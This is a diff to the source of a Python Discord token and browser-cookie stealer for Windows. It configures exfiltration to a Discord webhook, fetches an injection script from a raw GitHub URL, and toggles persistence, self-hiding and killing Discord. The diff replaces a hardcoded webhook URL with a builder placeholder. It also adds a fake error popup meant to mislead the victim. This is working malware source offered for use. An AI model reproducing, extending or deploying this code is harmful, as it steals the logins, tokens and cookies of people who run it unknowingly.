@@ -21,19 +21,21 @@ from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+error_message = "MESSAGE_HERE"
+
 config = {
-    # replace WEBHOOK_HERE with your webhook
-    'webhook': "https://discord.com/api/webhooks/962469675025956904/0etJFwLxaQlQ1oYaACkXrod-4u9yn4uVElCtzrl3y_qET56sfqxYQ4UVC7bALZxlw1SA",
-    # keep it as it is unless you want to have a custom one
+
+    'webhook': "WEBHOOK_HERE",
+
     'injection_url': "https://raw.githubusercontent.com/testy65421/site/main/shit.js",
-    # set to False if you don't want it to kill Discord upon running exe
-    'kill_discord': False,
-    # if you want the file to run at startup
-    'startup': False,
-    # if you want the file to hide itself after run
-    'hide_self': False,
-    # If you want to self destruct files after running change here
-    'self_destruct': False
+
+    'kill_discord': KILL_DISCORD_STATUS,
+
+    'startup': STARTUP_STATUS,
+
+    'hide_self': HIDE_SELF_STATUS,
+
+    'send_error_message': ERROR_MESSAGE_STATUS,
 }
 
 
@@ -766,6 +768,10 @@ class Cookies_Token_Grabber(functions):
         
         if os.path.exists(edge):
             os.remove(edge)
+
+        if self.config('send_error_message'):
+            print(pyautogui.alert(error_message))
+
 
 
 if __name__ == "__main__" and os.name == "nt":
